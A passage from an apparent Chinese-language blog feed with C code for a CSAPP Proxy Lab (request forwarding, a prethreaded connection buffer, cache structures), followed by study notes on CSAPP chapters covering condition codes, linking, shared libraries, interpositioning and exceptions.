client_rio;</span><br><span class="line">    <span class="type">int</span> server_fd;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readinitb</span>(&amp;client_rio,connfd);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">Rio_readlineb</span>(&amp;client_rio,buf,MAXLINE))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="comment">//writeup中提到这里有个多行请求行的问题,待处理</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Ideally  your  HTTP  request  parser  will  be  fullyrobust according to the relevant sections of RFC 1945, except for one detail: while the specification allowsfor multiline request fields</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">sscanf</span>(buf,<span class="string">"%s %s %s"</span>,requestline.method,uri,requestline.version);</span><br><span class="line">    <span class="type">int</span> headers_num = <span class="built_in">read_requesthdrs</span>(&amp;client_rio,requestheaders);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">parse_uri</span>(uri,&amp;requestline);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Host"</span>,requestline.host);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"User-Agent"</span>,user_agent_hdr);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Proxy-Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line"></span><br><span class="line">    server_fd = <span class="built_in">open_clientfd</span>(requestline.host,requestline.port);</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Connect to %s:%s.(serverFd: %d)\n"</span>,requestline.host,requestline.port,server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Write2Server</span>(server_fd,&amp;requestline,requestheaders,headers_num);</span><br><span class="line">    <span class="built_in">Forward2Client</span>(connfd,server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> listenfd,connfd;</span><br><span class="line">    <span class="type">char</span> client_hostname[MAXLINE];</span><br><span class="line">    <span class="type">char</span> client_port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_storage</span> clientaddr;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr,PREFIX_PRINT<span class="string">"usage: %s &lt;port&gt;\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = <span class="built_in">open_listenfd</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="built_in">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = <span class="built_in">accept</span>(listenfd,(SA*)&amp;clientaddr,&amp;clientlen);</span><br><span class="line">        <span class="built_in">Getnameinfo</span>((SA*)&amp;clientaddr,clientlen,client_hostname,MAXLINE,client_port,MAX_PORTLEN,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span>,client_hostname,client_port,connfd);</span><br><span class="line">        <span class="built_in">StartWork</span>(connfd);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-B-2"><a href="#Part-B-2" class="headerlink" title="Part B"></a>Part B</h2><p>并发做的是预线程化的方式.照书上实现了sbuf包实现对client_fd(connfd)的管理.将之前程序中的StartWork作为线程例程.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306251624471.png"></p><h3 id="sbuf包"><a href="#sbuf包" class="headerlink" title="sbuf包"></a>sbuf包</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SBUF_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBUF_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> {</span><br><span class="line">    <span class="type">int</span>* buf;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">int</span> front;  <span class="comment">//buf[(front+1)%count]为第一个item</span></span><br><span class="line">    <span class="type">int</span> rear;   <span class="comment">//buf[rear%count]为最后一个元素</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;</span><br><span class="line">    <span class="type">sem_t</span> slots;</span><br><span class="line">    <span class="type">sem_t</span> items;</span><br><span class="line">}<span class="type">sbuf_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span>* sp,<span class="type">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span>* sp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span>* sp,<span class="type">int</span> item)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span>* sp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    sp-&gt;buf = <span class="built_in">calloc</span>(n,<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    sp-&gt;count = n;</span><br><span class="line">    sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;slots,<span class="number">0</span>,n);</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;items,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">free</span>(sp-&gt;buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;slots);</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;count)] = item;</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;items);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;items);</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;count)];</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;slots);</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> listenfd,connfd;</span><br><span class="line">    <span class="type">char</span> client_hostname[MAXLINE];</span><br><span class="line">    <span class="type">char</span> client_port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_storage</span> clientaddr;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr,PREFIX_PRINT<span class="string">"usage: %s &lt;port&gt;\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sbuf_init</span>(&amp;sbuf,SBUFSIZE);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NTHREADS;++i)</span><br><span class="line">        <span class="built_in">pthread_create</span>(&amp;tid,<span class="literal">NULL</span>,StartWork,<span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    listenfd = <span class="built_in">open_listenfd</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="built_in">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = <span class="built_in">accept</span>(listenfd,(SA*)&amp;clientaddr,&amp;clientlen);        </span><br><span class="line">        <span class="built_in">Getnameinfo</span>((SA*)&amp;clientaddr,clientlen,client_hostname,MAXLINE,client_port,MAX_PORTLEN,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span>,client_hostname,client_port,connfd);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sbuf_insert</span>(&amp;sbuf,connfd);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-C-1"><a href="#Part-C-1" class="headerlink" title="Part C"></a>Part C</h2><p>类似于Cache lab的设计,读写cache使用的是读者优先的读者-写者模型.要注意的一点是读者读完后其实也会进行写(更新lru),所以也要上锁.<br>想清楚读者-写者模型的特征,每一个地方上锁是为了避免怎样的竞争,之后便可以根据需求做出变化.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> uri[MAXLINE];</span><br><span class="line">    <span class="type">char</span> content_type[MAXLINE];</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">    <span class="type">char</span> server[MAXLINE];</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> lru;</span><br><span class="line">}CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">{</span><br><span class="line">    CacheLine* cachelines;</span><br><span class="line">    <span class="type">size_t</span> current_lru;</span><br><span class="line">    <span class="type">size_t</span> cache_num;</span><br><span class="line">    <span class="type">size_t</span> cache_size;</span><br><span class="line">}Cache;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306271005363.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP--Notes</title>
      <link href="/2023/CSAPP--Notes/"/>
      <url>/2023/CSAPP--Notes/</url>
      
        <content type="html"><![CDATA[<p>CSAPP阅读笔记<br>文章仅作为笔者复习参考,其中内容仅为笔者当前阶段学习CSAPP的理解.</p><h1 id="第三章-程序的机器级表示"><a href="#第三章-程序的机器级表示" class="headerlink" title="第三章 程序的机器级表示"></a>第三章 程序的机器级表示</h1><h3 id="3-6-1条件码"><a href="#3-6-1条件码" class="headerlink" title="3.6.1条件码:"></a>3.6.1条件码:</h3><p>CF:进位标志.最近的操作使最高位产生了进位.<br>ZF:零标志.最近操作的结果为0.<br>SF:符号标志.最近的操作得到负数.<br>OF:溢出标志.最近的操作导致一个补码溢出<br>PF:奇偶标志位.最近操作的结果所有bit中1为偶数<br>AF:辅助进位标志位 运算过程中看最后四位,不论长度为多少 最后四位向前有进位或者借位,AF=1,否则AF=0<br>TF:调试标志位 当TF=1时,处理器每次只执行一条指令,即单步执行<br>IF:中断允许标志位 它用来控制8086是否允许接收外部中断请求 若IF=1,8086能响应外部中断,反之则屏蔽外部中断<br>DF:方向标志位 在串处理指令中,每次操作后,如果DF=0,si di递增,如果DF=1,si di递减;注意此处DF的值是由程序员进行设定的 cld命令是将DF设置为0,std命令是将DF设置为1<br>进位标志表示无符号数运算结果是否超出范围，运算结果仍然正确；<br>溢出标志表示有符号数运算结果是否超出范围，运算结果已经不正确。<br>leaq指令不改变任何条件码.对于逻辑操作,进位标志和溢出标志会设置成0.对于移作,进位标志将设置为最后一个被移出的位,溢出标志设置为0.INC和DEC指令仅设出和零标志.</p><span id="more"></span><h1 id="第七章-链接"><a href="#第七章-链接" class="headerlink" title="第七章 链接"></a>第七章 链接</h1><h2 id="7-3目标文件"><a href="#7-3目标文件" class="headerlink" title="7.3目标文件"></a>7.3目标文件</h2><ol><li>可重定位目标文件:由编译器和汇编器产生,包含从地址0开始的代码和数据节</li><li>可执行目标文件:可直接复制到内存并执行</li><li>共享目标文件:特殊类型的可重定位目标文件,可以在加载或者运行时被动态地加载进内存并链接.</li></ol><h2 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h2><p>static属性的C函数和全局变量为局部符号,仅为定义该符号的模块(源文件)所私有,其他模块无法通过extern声明使用.用static来保护变量和函数是良好的编程习惯.</p><h3 id="符号表条目"><a href="#符号表条目" class="headerlink" title="符号表条目"></a>符号表条目</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>{</span></span><br><span class="line"><span class="type">int</span> name;</span><br><span class="line"><span class="type">char</span> type:<span class="number">4</span>,</span><br><span class="line">binding:<span class="number">4</span>;</span><br><span class="line"><span class="type">char</span> reserved;</span><br><span class="line"><span class="type">short</span> section;</span><br><span class="line"><span class="type">long</span> value;</span><br><span class="line"><span class="type">long</span> size;</span><br><span class="line">}Elf64_Symbol;</span><br></pre></td></tr></tbody></table></figure><p>name是字符串表(.strtab)中对应符号的字节偏移,type是数据或函数.binding指示符号是本地还是全局.value是距定义目标的节的起始位置的偏移(相对地址,<code>对于可执行目标文件来说,该值是一个绝对运行时地址</code>.<del>不是很理解呢?</del>)<br>每个符号被分配到目标文件的某个节,由section表示.<br>有三个特殊的伪节(仅存在于可重定位目标文件中):<br>    1.ABS 不该被重定位的符号<br>    2.UNDEF 未定义的符号<br>    3.COMMON 未初始化的全局变量<br>区别于COMMON节,bss分配未初始化的静态变量,以及初始化为0的全局或静态变量.</p><h2 id="7-6符号解析"><a href="#7-6符号解析" class="headerlink" title="7.6符号解析"></a>7.6符号解析</h2><p>将每个引用于它输入的可重定位目标文件的符号表中的一个确定符号定义关联</p><h3 id="7-6-1-多重定义的全局符号"><a href="#7-6-1-多重定义的全局符号" class="headerlink" title="7.6.1 多重定义的全局符号"></a>7.6.1 多重定义的全局符号</h3><p>函数和已初始化的全局变量是强符号,未初始化的全局变量是弱符号.<br>规则1:不允许多个同名的强符号<br>规则2:如果一个强符号和多个弱符号同名,选强符号<br>规则3:如果多个弱符号同名,则任意选择一个</p><p>该规则下会造成一些不易察觉的运行时错误.使用GCC-fno_common标志指示链接器不允许多重定义全局符号.</p><h3 id="7-6-2-与静态库链接"><a href="#7-6-2-与静态库链接" class="headerlink" title="7.6.2 与静态库链接"></a>7.6.2 与静态库链接</h3><h4 id="为什么要支持库的概念"><a href="#为什么要支持库的概念" class="headerlink" title="为什么要支持库的概念"></a>为什么要支持库的概念</h4><p>方案一:让编译器辨认出对标准函数的调用,并生成相应代码.<br>缺点:编译器过于复杂,每次增删改一个标准函数,就需要一个新版本编译器<br>方案二:将所有标准函数放在一个可重定位目标文件libc.o中<br>缺点:内存占用大,更新编译时间长<br>方案三:相关函数编译为独立的目标模块(静态库),链接时只复制被程序引用的目标模块.</p><h4 id="静态库实现"><a href="#静态库实现" class="headerlink" title="静态库实现"></a>静态库实现</h4><p>Linux以存档(archive)的特殊文件格式存储静态库.存档文件时一组连接起来的可重定位目标文件的集合,有一个头部用来描述每个成员目标文件的大小和位置(.a)</p><h3 id="7-6-3-链接器解析引用"><a href="#7-6-3-链接器解析引用" class="headerlink" title="7.6.3 链接器解析引用"></a>7.6.3 链接器解析引用</h3><p>在符号解析阶段,链接器从左到右按照静态库在命令行中出现的顺序扫描可重定位目标文件和存档文件(自动将.c翻译为.o).在这次扫描中,链接器维护一个可重定位文件的集合E(这个集合中的文件会被合并起来形成可执行文件),一个未解析的符号(引用了但未定义)集合U,一个在前面输入文件中已定义的符号集合D.初始时EUD均为空。<br>对于命令行中每一个输入文件f,若为目标文件,则把f添加到E,修改U和D反应f中的符号定义和引用.若为存档文件,遍历目录尝试寻找可重定位目标文件m匹配U中的未定义符号,将m添加到E中,修改U和D反应f中的符号定义和引用,直到U和D不再发生变化.此时不在E中的目标文件都被简单的丢弃.<br>若完成所有f的扫描后,U是非空的,则报错.否则就合并和重定位E中的目标文件,构建输出的可执行文件.<br>这样的算法决定了链接时文件需要排序.</p><h2 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h2><p>重定位将合并输入模块,为每个符号分配运行时地址.<br>重定位由两步组成:<br>    1.重定位节和符号定义.链接器将所有相同类型的节合并为同一类型的聚合节.然后将运行时的内存地址赋给新的聚合节,赋给输入模块定义的每个节,赋给输入模块定义的每个符号<br>    2.重定位节中的符号引用.依赖重定位条目,修改对每个符号的引用,使得它们指向正确的运行时地址.</p><h3 id="7-7-1-重定位条目"><a href="#7-7-1-重定位条目" class="headerlink" title="7.7.1 重定位条目"></a>7.7.1 重定位条目</h3><p>汇编器对最终位置未知的目标引用,生成一个重定位条目,指示链接器在合并时如何修改这个引用.代码的重定位条目放在.rel.text中,已初始化数据的重定位条目放在.rel.data中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>{</span></span><br><span class="line"><span class="type">long</span> offset; <span class="comment">//符号引用距该节的字节偏移(节偏移)</span></span><br><span class="line"><span class="type">long</span> type:<span class="number">32</span>,<span class="comment">//指示如何修改引用</span></span><br><span class="line">symbol:<span class="number">32</span>;<span class="comment">//符号表中的index</span></span><br><span class="line"><span class="type">long</span> addend;<span class="comment">//有符号常数,指示对地址做偏移调整</span></span><br><span class="line">}Elf64_Rela</span><br></pre></td></tr></tbody></table></figure><p>链接器在每个节以及每个与该节相关联的重定位条目上迭代执行,根据不同重定位类型对修改引用为运行时地址相关数据.(绝对寻址、PC相对寻址…)</p><h2 id="7-10-动态链接库"><a href="#7-10-动态链接库" class="headerlink" title="7.10 动态链接库"></a>7.10 动态链接库</h2><h3 id="静态库的缺点"><a href="#静态库的缺点" class="headerlink" title="静态库的缺点"></a>静态库的缺点</h3><p>若静态库更新,必须显示的将程序与新的静态库重新链接.<br>且对一些大量使用的函数,这些函数的代码将会被复制到每个运行进程的文本段中,浪费内存.</p><h3 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h3><p>共享库(共享目标)是一个目标模块,在运行和加载时加载到相应内存地址,并和一个在内存中的程序链接起来.这一动态链接的过程由一个叫动态链接器的程序执行.在Linux中使用.so后缀,在微软操作系统中被称为DLL.<br>一个共享库的.text节的一个副本可以被不同的正在运行时的进程共享.</p><h2 id="7-11-从应用程序中加载和链接共享库"><a href="#7-11-从应用程序中加载和链接共享库" class="headerlink" title="7.11 从应用程序中加载和链接共享库"></a>7.11 从应用程序中加载和链接共享库</h2><p>dlopen,dlsym,dlerror.</p><h2 id="7-12-位置无关代码-fpic"><a href="#7-12-位置无关代码-fpic" class="headerlink" title="7.12 位置无关代码 -fpic"></a>7.12 位置无关代码 -fpic</h2><p>将共享库加载到内存的任意位置</p><h3 id="PIC数据引用"><a href="#PIC数据引用" class="headerlink" title="PIC数据引用"></a>PIC数据引用</h3><p>无论在任意地址加载一个目标模块,数据段与代码段距离保持不变.<br>编译器在数据段开始的地方创建GOT表,加载时动态链接器会重定位GOT表中的每个条目,使得它包含目标的绝对地址.<br>程序运行时,指令通过固定偏移访问对应GOT表并取出绝对地址,完成数据引用的解析.</p><h3 id="PIC函数调用"><a href="#PIC函数调用" class="headerlink" title="PIC函数调用"></a>PIC函数调用</h3><p>详见ret2dl_resolve.</p><h2 id="7-13-库打桩机制"><a href="#7-13-库打桩机制" class="headerlink" title="7.13 库打桩机制"></a>7.13 库打桩机制</h2><p>基本思想:给定一个需要打桩的目标函数,创建一个包装函数,它的院线和目标函数完全一样,使用某种特殊的打桩机制,欺骗系统调用目标函数,再将目标函数的返回值传递给调用者.</p><h3 id="7-13-1-编译时打桩"><a href="#7-13-1-编译时打桩" class="headerlink" title="7.13.1 编译时打桩"></a>7.13.1 编译时打桩</h3><p>更改可重定位目标文件路径.</p><h3 id="7-13-2-链接时打桩"><a href="#7-13-2-链接时打桩" class="headerlink" title="7.13.2 链接时打桩"></a>7.13.2 链接时打桩</h3><p>Linux静态链接器支持使用–wrap f标志打桩,将对f的引用解析成__wrap_f,把对__real_f的引用解析为f<br>gcc -Wl,–wrap,malloc</p><h3 id="7-13-3-运行时打桩"><a href="#7-13-3-运行时打桩" class="headerlink" title="7.13.3 运行时打桩"></a>7.13.3 运行时打桩</h3><p>修改动态链接器的LD_PRELOAD环境变量</p><h1 id="第八章-异常控制流"><a href="#第八章-异常控制流" class="headerlink" title="第八章 异常控制流"></a>第八章 异常控制流</h1><h2 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h2><p>处理器状态变化称为事件.<br>在任何情况下,当处理器检测到事件发生,它通过一张由异常表基址寄存器寻址的跳转表(即异常表),进行一个间接过程调用,到一个专门设计用来处理这类实践的操作系统子程序_——异常处理程序.</p><h3 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h3><p>系统中每种可能类型的异常都分配有一个非负整数的异常号,部分由处理器定义(被零除、缺页、内存访问违例、断点以及算术运算溢出),其他由操作系统内核定义(系统调用,外部IO信号)</p><p>当系统启动(计算机重启或加电)时,操作系统分配和初始化一张名为异常表的跳转表,当异常发生,处理器通过异常表基址n和异常号k,调用n+4*k地址存放的异常处理函数指针.</p><p>异常处理程序运行在内核模式下,对所有的系统资源有完全的访问权限.<br>当控制从用户程序转移到内核,所有的状态信息将压入内核栈中.</p><p>ps:linux系统调用使用的跳转表并非异常表,但也需要通过0x80号异常先进入异常处理程序再进一步跳转.</p><h3 id="8-1-2-异常的类别"><a href="#8-1-2-异常的类别" class="headerlink" title="8.1.2 异常的类别"></a>8.1.2 异常的类别</h3><ol><li>中断:处理器外部IO设备信号</li><li>陷阱和系统调用:执行一条指令产生的有意旳异常,在用户程序和内核之间提供一个接口,即系统调用.</li><li>故障:由错误情况引起,可能被故障处理程序修正,若成功修正就重新执行引起故障的指令,否则返回到abort例程终止程序.(如缺页,以及linux中的段错误,但linux并不会尝试恢复这个错误.)</li><li>终止:不可恢复的致命错误,返回到abort例程终止应用程序.</li></ol><h2 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h2><p>进程是一个执行中程序的实例.系统中每个程序都运行在某个进程的上下文中.</p><h3 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h3><p>处理器用某个控制寄存器的一个模式位来标识运行模式.<br>linux提供/proc文件系统,允许用户模式进程访问内核数据结构内容.</p><h4 id="proc文件系统-待补充"><a href="#proc文件系统-待补充" class="headerlink" title="/proc文件系统 待补充"></a>/proc文件系统 待补充</h4><h3 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h3><p>内核为每个进程维持一个上下文.上下文是内核重新启动一个被抢占的进程所需的状态.也是程序正确运行所必须的状态.<br>在进程的某些时刻,内核可以决定抢占当前进程,并重新开始一个先前被抢占的进程.这种决策叫做调度,由内核中称为调度器的代码处理.</p><h2 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h2><p>当系统级函数遇到错误时,通常会设置全局整型变量errno,可以通过错误报告函数(输出错误信息,处理错误或退出程序)以及错误处理包装函数(将可能发生错误的函数和错误处理函数封装到一起)来处理错误同时防止代码臃肿.</p><h2 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h2><h3 id="8-4-3-回收子进程"><a 